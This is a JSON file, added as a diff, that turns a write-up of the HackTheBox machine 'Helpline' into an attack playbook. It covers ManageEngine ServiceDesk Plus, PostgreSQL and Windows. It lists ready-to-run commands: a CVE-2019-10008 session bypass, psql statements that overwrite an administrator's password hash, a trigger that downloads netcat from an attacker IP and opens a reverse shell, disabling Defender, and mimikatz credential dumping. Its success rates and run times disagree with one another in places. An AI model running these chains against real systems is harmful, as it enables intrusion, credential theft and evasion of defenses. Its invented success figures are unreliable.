@@ -1,0 +1,951 @@
+{
+  "writeup_id": "Htb_Helpline_Kali",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_servicedesk_plus_privilege_escalation",
+    "primary_services": [
+      "http",
+      "postgresql",
+      "smb"
+    ],
+    "port_signature": "80+5432+445",
+    "service_combination": "web+database+file_sharing",
+    "os_family": "windows_server",
+    "environment_type": "enterprise_helpdesk",
+    "entry_vector": "cve_exploitation",
+    "privilege_path": "web_user_to_system",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "servicedesk_plus_application",
+      "mobile_client_auth_bypass",
+      "postgresql_database_access",
+      "encrypted_flag_files"
+    ],
+    "environmental_clues": [
+      "manageengine_servicedesk_plus",
+      "postgres_database_integration",
+      "bcrypt_password_hashes",
+      "mobile_client_endpoint"
+    ],
+    "similar_scenarios": [
+      "jeeves_htb_medium",
+      "bart_htb_medium"
+    ],
+    "unique_aspects": [
+      "cve_2019_10008_mobile_client",
+      "postgres_password_manipulation",
+      "system_shell_via_web_app",
+      "multiple_privilege_escalation_paths"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "CVE-2019-10008_Mobile_Client_Bypass",
+        "success_reason": "Mobile client authentication bypass via session manipulation",
+        "prerequisite_indicators": [
+          "servicedeskplus_running",
+          "mobile_client_endpoint_accessible",
+          "guest_account_enabled",
+          "shared_session_architecture"
+        ],
+        "recognition_patterns": [
+          "/mc endpoint available",
+          "different login interface for mobile",
+          "session cookies shared between interfaces",
+          "logout/login sequence manipulation possible"
+        ],
+        "failure_modes": [
+          "mobile_client_disabled",
+          "separate_session_management",
+          "guest_account_disabled",
+          "proper_session_validation"
+        ],
+        "environmental_factors": [
+          "default_servicedeskplus_config",
+          "legacy_session_handling",
+          "insufficient_authentication_validation"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Database_Password_Manipulation",
+        "success_reason": "Direct postgres database access allowed password hash modification",
+        "prerequisite_indicators": [
+          "postgres_database_accessible",
+          "database_credentials_available",
+          "aaapassword_table_writable",
+          "bcrypt_hash_format_known"
+        ],
+        "recognition_patterns": [
+          "postgres service on non-standard port",
+          "servicedeskplus database structure",
+          "aaapassword and aaalogin tables present",
+          "bcrypt hash format in password field"
+        ],
+        "failure_modes": [
+          "database_not_accessible",
+          "insufficient_database_privileges",
+          "password_validation_prevents_changes",
+          "application_caches_credentials"
+        ],
+        "environmental_factors": [
+          "postgres_default_configuration",
+          "servicedeskplus_database_integration",
+          "weak_database_access_controls"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Custom_Trigger_Code_Execution",
+        "success_reason": "Admin interface allowed arbitrary command execution via triggers",
+        "prerequisite_indicators": [
+          "admin_access_to_servicedeskplus",
+          "custom_triggers_feature_enabled",
+          "trigger_execution_as_system",
+          "ticket_creation_possible"
+        ],
+        "recognition_patterns": [
+          "admin panel accessible",
+          "custom triggers configuration available",
+          "script execution fields present",
+          "trigger conditions configurable"
+        ],
+        "failure_modes": [
+          "triggers_disabled",
+          "command_execution_restricted",
+          "triggers_run_as_limited_user",
+          "input_validation_prevents_injection"
+        ],
+        "environmental_factors": [
+          "servicedeskplus_admin_features",
+          "system_level_service_execution",
+          "unrestricted_trigger_functionality"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Mobile client authentication bypass",
+        "discovery_method": "CVE-2019-10008 exploitation via /mc endpoint",
+        "why_critical": "Bypassed authentication to gain admin access without credentials",
+        "how_to_recognize": [
+          "servicedeskplus version vulnerable",
+          "/mc endpoint responds differently",
+          "session manipulation possible",
+          "guest account available"
+        ],
+        "follow_up_actions": [
+          "access_admin_panel",
+          "create_custom_triggers",
+          "execute_system_commands"
+        ]
+      },
+      {
+        "discovery": "Direct database access with modification privileges",
+        "discovery_method": "Postgres connection with write access to authentication tables",
+        "why_critical": "Allowed direct manipulation of user credentials bypassing application controls",
+        "how_to_recognize": [
+          "postgres service accessible",
+          "servicedeskplus database structure",
+          "write permissions on aaapassword table",
+          "known hash formats"
+        ],
+        "follow_up_actions": [
+          "identify_target_user_ids",
+          "copy_known_password_hashes",
+          "update_administrator_credentials"
+        ]
+      },
+      {
+        "discovery": "EFS encrypted flag files",
+        "discovery_method": "Cipher command analysis showing encryption status",
+        "why_critical": "Revealed that SYSTEM access insufficient - need actual user credentials",
+        "how_to_recognize": [
+          "access_denied_as_system",
+          "cipher_command_shows_encryption",
+          "specific_user_certificate_required",
+          "efs_encryption_indicators"
+        ],
+        "follow_up_actions": [
+          "obtain_administrator_password",
+          "use_mimikatz_for_credential_extraction",
+          "decrypt_files_as_proper_user"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "guest_user",
+        "escalation_method": "Mobile_Client_Authentication_Bypass",
+        "why_possible": "Shared session architecture between main and mobile interfaces",
+        "recognition_signs": [
+          "servicedeskplus_with_mobile_client",
+          "session_cookies_shared",
+          "logout_login_sequence_manipulation",
+          "cve_2019_10008_applicable"
+        ],
+        "exploitation_path": "Guest Login → /mc → Logout → Admin Login → Full Admin Access"
+      },
+      {
+        "privilege_level": "admin_user",
+        "escalation_method": "Custom_Trigger_System_Execution",
+        "why_possible": "Admin interface allows arbitrary script execution via triggers",
+        "recognition_signs": [
+          "admin_panel_access",
+          "custom_triggers_available",
+          "script_execution_fields",
+          "system_level_service_context"
+        ],
+        "exploitation_path": "Admin Access → Custom Trigger → High Priority Ticket → SYSTEM Shell"
+      },
+      {
+        "privilege_level": "database_access",
+        "escalation_method": "Direct_Credential_Manipulation",
+        "why_possible": "Write access to authentication tables with known hash formats",
+        "recognition_signs": [
+          "postgres_database_accessible",
+          "aaapassword_table_writable",
+          "bcrypt_hash_format",
+          "user_id_mapping_available"
+        ],
+        "exploitation_path": "DB Access → Hash Replacement → Admin Login → System Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ServiceDesk Plus (SDP) application running on port 8080",
+        "decision": "Identify SDP version and check for known vulnerabilities",
+        "reasoning": "SDP has multiple known CVEs that can lead to privilege escalation",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "web_enumeration",
+            "when": "if version detection fails"
+          },
+          {
+            "option": "default_credentials",
+            "when": "if guest access available"
+          }
+        ],
+        "success_indicators": [
+          "version_identified",
+          "guest_login_successful",
+          "admin_panel_accessible"
+        ],
+        "next_decision": "choose_sdp_exploit_method"
+      },
+      {
+        "step": 2,
+        "situation": "Confirmed SDP with guest access available",
+        "decision": "Try CVE-2019-10008 mobile client bypass first",
+        "reasoning": "Requires only guest credentials and provides admin access",
+        "confidence": 0.85,
+        "prerequisites": [
+          "guest_credentials_available",
+          "mobile_client_endpoint_accessible"
+        ],
+        "success_indicators": [
+          "admin_session_cookies_obtained"
+        ],
+        "failure_fallbacks": [
+          "database_password_change",
+          "other_sdp_exploits"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Obtained admin access to SDP",
+        "decision": "Create custom trigger for command execution",
+        "reasoning": "Triggers execute with SYSTEM privileges when tickets are created",
+        "confidence": 0.95,
+        "prerequisites": [
+          "admin_access_to_sdp",
+          "custom_triggers_available"
+        ],
+        "success_indicators": [
+          "trigger_created_successfully",
+          "high_priority_ticket_created"
+        ],
+        "next_decision": "execute_system_shell"
+      },
+      {
+        "step": 4,
+        "situation": "Got SYSTEM shell but files are EFS encrypted",
+        "decision": "Use mimikatz to extract credentials for decryption",
+        "reasoning": "EFS encrypted files require user credentials even with SYSTEM access",
+        "confidence": 0.8,
+        "prerequisites": [
+          "system_shell_obtained",
+          "efs_encryption_detected"
+        ],
+        "success_indicators": [
+          "mimikatz_executed",
+          "credentials_extracted"
+        ],
+        "failure_fallbacks": [
+          "alternative_credential_extraction",
+          "registry_dump"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_sdp_identified": {
+        "action": "enumerate_sdp_vulnerabilities",
+        "tools": [
+          "burp",
+          "browser",
+          "exploit_scripts"
+        ],
+        "next_phase": "privilege_escalation_via_sdp"
+      },
+      "if_mobile_client_bypass_succeeds": {
+        "action": "create_command_execution_trigger",
+        "tools": [
+          "custom_trigger_interface",
+          "powershell_payload"
+        ],
+        "next_phase": "system_shell_execution"
+      },
+      "if_database_access_available": {
+        "action": "modify_administrator_password_hash",
+        "tools": [
+          "psql",
+          "bcrypt_hash"
+        ],
+        "next_phase": "admin_login_with_modified_creds"
+      },
+      "if_efs_encryption_detected": {
+        "action": "disable_defender_and_run_mimikatz",
+        "tools": [
+          "mimikatz",
+          "powershell"
+        ],
+        "next_phase": "credential_extraction_for_decryption"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_for_sdp_mobile_client_vulnerability",
+        "reasoning": "high_success_rate_and_easy_exploitation",
+        "applicability": "servicedeskplus_environments"
+      },
+      {
+        "rule": "use_custom_triggers_for_system_execution",
+        "reasoning": "reliable_system_level_code_execution",
+        "applicability": "sdp_admin_access_obtained"
+      },
+      {
+        "rule": "check_for_efs_encryption_on_sensitive_files",
+        "reasoning": "system_access_may_not_be_sufficient_for_encrypted_files",
+        "applicability": "windows_environments_with_system_access"
+      },
+      {
+        "rule": "disable_defender_before_running_mimikatz",
+        "reasoning": "prevents_quarantine_of_credential_extraction_tools",
+        "applicability": "system_level_access_on_windows"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SDP Mobile Client Authentication Bypass",
+        "mitre_id": "T1078.004",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "servicedeskplus_application",
+          "mobile_client_endpoint_accessible",
+          "guest_account_enabled"
+        ],
+        "success_indicators": [
+          "mc_endpoint_responds",
+          "session_cookies_captured",
+          "admin_dashboard_accessible"
+        ],
+        "incompatible_with": [
+          "mobile_client_disabled",
+          "guest_account_disabled",
+          "patched_sdp_version"
+        ],
+        "confidence_boosters": [
+          "default_guest_credentials",
+          "unpatched_sdp_installation",
+          "mobile_client_banner_present"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Database Password Hash Manipulation",
+        "mitre_id": "T1556.001",
+        "required_services": [
+          "postgresql"
+        ],
+        "required_ports": [
+          5432,
+          65432
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "database_access_available",
+          "user_authentication_table_writable",
+          "known_password_hash_available"
+        ],
+        "success_indicators": [
+          "password_table_updated",
+          "authentication_successful",
+          "elevated_access_gained"
+        ],
+        "incompatible_with": [
+          "database_access_restricted",
+          "read_only_database_user",
+          "encrypted_password_storage"
+        ],
+        "confidence_boosters": [
+          "postgres_superuser_access",
+          "bcrypt_hash_format_identified",
+          "application_user_table_located"
+        ],
+        "typical_success_rate": 0.95,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "ServiceDesk Plus Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "servicedeskplus_detected",
+          "vulnerable_version_identified",
+          "web_interface_accessible"
+        ],
+        "success_indicators": [
+          "admin_panel_access",
+          "system_shell_obtained",
+          "privilege_escalation_successful"
+        ],
+        "incompatible_with": [
+          "patched_sdp_version",
+          "web_application_firewall",
+          "network_segmentation"
+        ],
+        "confidence_boosters": [
+          "default_installation_detected",
+          "version_banner_visible",
+          "known_cve_applicable"
+        ],
+        "typical_success_rate": 0.88,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "servicedeskplus": {
+        "port_indicators": [
+          8080,
+          8443,
+          8020
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "ServiceDesk Plus",
+          "ManageEngine",
+          "SDP"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "postgresql_database": {
+        "port_indicators": [
+          5432,
+          65432
+        ],
+        "service_indicators": [
+          "postgresql"
+        ],
+        "banner_indicators": [
+          "PostgreSQL",
+          "postgres"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "windows_domain": {
+        "port_indicators": [
+          88,
+          389,
+          445,
+          3389
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "rdp"
+        ],
+        "banner_indicators": [
+          "Windows Server",
+          "Active Directory"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "sdp_mobile_client_bypass",
+          "when": "servicedeskplus_detected",
+          "reason": "quick_admin_access_no_credentials_needed"
+        },
+        {
+          "attack": "database_password_manipulation",
+          "when": "postgresql_access_available",
+          "reason": "reliable_privilege_escalation_method"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "sdp_cve_exploitation",
+          "when": "vulnerable_sdp_version_detected",
+          "reason": "system_level_access_but_requires_specific_version"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "ServiceDesk Plus Mobile Client Authentication Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "CVE-2019-10008 exploit",
+            "command_template": "python cve-2019-10008.py",
+            "actual_command": "./cve-2019-10008.py",
+            "output_pattern": "JSESSIONID=",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "servicedeskplus_accessible",
+          "mobile_client_endpoint_available",
+          "guest_account_enabled"
+        ],
+        "success_indicators": [
+          "admin_session_cookies_obtained",
+          "admin_panel_accessible",
+          "privilege_escalation_possible"
+        ],
+        "common_failures": [
+          "mobile_client_disabled",
+          "guest_account_disabled",
+          "patched_version"
+        ],
+        "follow_up_techniques": [
+          "custom_trigger_creation",
+          "database_manipulation",
+          "credential_harvesting"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "PostgreSQL Database Password Manipulation",
+        "mitre_id": "T1556.001",
+        "category": "persistence",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "psql",
+            "command_template": "./psql.exe -h {host} -p {port} -U {user} -w -d {database} -c \"{query}\"",
+            "actual_command": "./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c \"update aaapassword set password='`$2a`$12`$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='`$2a`$12`$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;\"",
+            "output_pattern": "UPDATE 1",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "database_access_available",
+          "postgres_credentials_known",
+          "password_table_structure_identified"
+        ],
+        "success_indicators": [
+          "password_hash_updated_successfully",
+          "admin_login_successful",
+          "elevated_privileges_obtained"
+        ],
+        "common_failures": [
+          "sql_escaping_issues",
+          "database_permissions_insufficient",
+          "hash_format_mismatch"
+        ],
+        "follow_up_techniques": [
+          "custom_trigger_creation",
+          "system_command_execution",
+          "credential_dumping"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Custom Trigger Code Execution",
+        "mitre_id": "T1053.005",
+        "category": "execution",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "ServiceDesk Plus Admin Panel",
+            "command_template": "cmd /c powershell iwr -uri {attacker_ip}/{payload} -outfile {target_path}; {target_path} -e cmd.exe {attacker_ip} {port}",
+            "actual_command": "cmd /c powershell iwr -uri 10.10.14.14/nc64.exe -outfile c:\\windows\\system32\\spool\\drivers\\color\\nc.exe; c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.14 443",
+            "output_pattern": "reverse_shell_connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "admin_access_to_sdp",
+          "custom_triggers_feature_available",
+          "high_priority_ticket_creation_ability"
+        ],
+        "success_indicators": [
+          "trigger_created_successfully",
+          "payload_downloaded",
+          "system_shell_obtained"
+        ],
+        "common_failures": [
+          "antivirus_blocking_payload",
+          "network_restrictions",
+          "trigger_conditions_not_met"
+        ],
+        "follow_up_techniques": [
+          "credential_dumping",
+          "efs_decryption",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Windows Defender Bypass",
+        "mitre_id": "T1562.001",
+        "category": "defense_evasion",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "PowerShell",
+            "command_template": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+            "actual_command": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+            "output_pattern": "no_error_output",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "system_level_privileges",
+          "powershell_available",
+          "defender_active"
+        ],
+        "success_indicators": [
+          "real_time_monitoring_disabled",
+          "malicious_files_not_quarantined",
+          "tools_execute_successfully"
+        ],
+        "common_failures": [
+          "insufficient_privileges",
+          "group_policy_restrictions",
+          "tamper_protection_enabled"
+        ],
+        "follow_up_techniques": [
+          "mimikatz_execution",
+          "credential_dumping",
+          "persistence_establishment"
+        ],
+        "time_investment": "1-2 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Mimikatz Credential Extraction",
+        "mitre_id": "T1003.001",
+        "category": "credential_access",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "Mimikatz",
+            "command_template": "privilege::debug\nsekurlsa::logonpasswords",
+            "actual_command": "privilege::debug\nsekurlsa::logonpasswords",
+            "output_pattern": "* Username :",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "system_level_privileges",
+          "lsass_process_accessible",
+          "antivirus_disabled"
+        ],
+        "success_indicators": [
+          "debug_privilege_obtained",
+          "credentials_extracted",
+          "ntlm_hashes_recovered"
+        ],
+        "common_failures": [
+          "version_compatibility_issues",
+          "lsa_protection_enabled",
+          "credential_guard_active"
+        ],
+        "follow_up_techniques": [
+          "efs_decryption",
+          "pass_the_hash",
+          "lateral_movement"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "CVE-2019-10008 exploit",
+        "use_case": "servicedeskplus_authentication_bypass",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "servicedeskplus_environments"
+        ],
+        "alternatives": [
+          "credential_brute_force",
+          "sql_injection"
+        ],
+        "best_practices": [
+          "modify_target_ip_in_script",
+          "add_encoding_header_for_special_characters",
+          "set_cookies_in_browser_immediately"
+        ]
+      },
+      {
+        "tool": "PostgreSQL psql",
+        "use_case": "database_credential_manipulation",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "postgresql_based_applications"
+        ],
+        "alternatives": [
+          "direct_database_file_modification",
+          "application_specific_tools"
+        ],
+        "best_practices": [
+          "use_backticks_to_escape_dollar_signs",
+          "verify_table_structure_before_modification",
+          "backup_original_values_before_changes"
+        ]
+      },
+      {
+        "tool": "Mimikatz",
+        "use_case": "windows_credential_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "medium",
+        "essential_for": [
+          "windows_post_exploitation"
+        ],
+        "alternatives": [
+          "procdump_lsass",
+          "comsvcs_dll",
+          "pypykatz"
+        ],
+        "best_practices": [
+          "disable_antivirus_before_execution",
+          "use_compatible_version_for_target_os",
+          "run_privilege_debug_before_credential_extraction"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "sdp_mobile_client_bypass_to_system",
+        "steps": [
+          {
+            "step": 1,
+            "command": "./cve-2019-10008.py",
+            "purpose": "Extract admin session cookies",
+            "expected_output": "JSESSIONID and other session cookies"
+          },
+          {
+            "step": 2,
+            "command": "Set cookies in browser and navigate to admin panel",
+            "purpose": "Gain administrative access",
+            "expected_output": "Admin interface accessible"
+          },
+          {
+            "step": 3,
+            "command": "Create custom trigger with reverse shell payload",
+            "purpose": "Establish code execution mechanism",
+            "expected_output": "Trigger created successfully"
+          },
+          {
+            "step": 4,
+            "command": "Create high priority ticket to activate trigger",
+            "purpose": "Execute payload and get shell",
+            "expected_output": "SYSTEM shell connection"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "postgres_password_reset_to_admin",
+        "steps": [
+          {
+            "step": 1,
+            "command": "./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c \"select aaapassword.password_id, aaalogin.name from aaalogin, aaapassword where aaalogin.login_id = aaapassword.password_id\"",
+            "purpose": "Identify administrator account ID",
+            "expected_output": "List of users with password IDs"
+          },
+          {
+            "step": 2,
+            "command": "./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c \"update aaapassword set password='`$2a`$12`$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='`$2a`$12`$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;\"",
+            "purpose": "Set administrator password to guest password",
+            "expected_output": "UPDATE 1"
+          },
+          {
+            "step": 3,
+            "command": "Login to SDP with administrator/guest credentials",
+            "purpose": "Gain admin access to application",
+            "expected_output": "Successful admin login"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Helpline",
+      "difficulty": "Hard",
+      "os": "Windows Server 2016",
+      "platform": "HackTheBox",
+      "release_date": "2019-04-27",
+      "author": "egre55",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "web_application",
+        "database_exploitation",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "cve_2019_10008",
+        "authentication_bypass",
+        "database_access"
+      ],
+      "environment_type": "corporate_helpdesk_system",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "servicedeskplus_exploitation",
+        "mobile_client_bypass",
+        "postgres_database_manipulation"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "database_fundamentals",
+        "windows_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "authentication_bypass",
+        "database_exploitation",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "secure_authentication",
+        "database_hardening",
+        "session_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Arkham",
+        "Querier",
+        "Giddy"
+      ],
+      "similarity_reasons": [
+        "web_application_focus",
+        "database_exploitation",
+        "windows_environment"
+      ],
+      "unique_aspects": [
+        "servicedeskplus_exploitation",
+        "mobile_client_bypass",
+        "encrypted_flag_files"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "multiple_exploitation_paths",
+        "encrypted_artifacts"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T02:01:55.563920",
+    "original_file": "0xdf_writeups/Htb Helpline Kali.md",
+    "content_length": 46427,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
